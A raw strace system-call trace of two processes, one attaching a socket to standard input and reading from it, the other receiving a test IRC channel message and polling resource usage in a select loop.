12208 20:24:33.479268 _llseek(1, 0, 0xbfcab4f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.479297 dup(8)            = 6
12208 20:24:33.479309 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab4d8) = -1 EINVAL (Invalid argument)
12208 20:24:33.479320 _llseek(6, 0, 0xbfcab520, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12208 20:24:33.479330 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12208 20:24:33.479347 dup2(6, 0)        = 0
12208 20:24:33.479357 close(6)          = 0
12208 20:24:33.479379 fcntl64(0, F_SETFD, 0) = 0
12208 20:24:33.479393 fcntl64(0, F_SETFD, 0) = 0
12208 20:24:33.479411 read(0,  <unfinished ...>
4519  20:24:33.759197 <... select resumed> ) = 1 (in [7], left {0, 660000})
4519  20:24:33.759197 clock_gettime(CLOCK_MONOTONIC, {48683, 576206182}) = 0
4519  20:24:33.759197 recv(7, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  20:24:33.759197 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759198 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759198 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759198 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759200 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759216 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759229 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759244 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759257 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759271 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759287 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759302 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759315 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759329 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759343 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759357 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759370 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759384 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759398 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759413 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759438 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759453 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:24:33.759492 gettimeofday({1495671873, 759496}, NULL) = 0
4519  20:24:33.759521 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
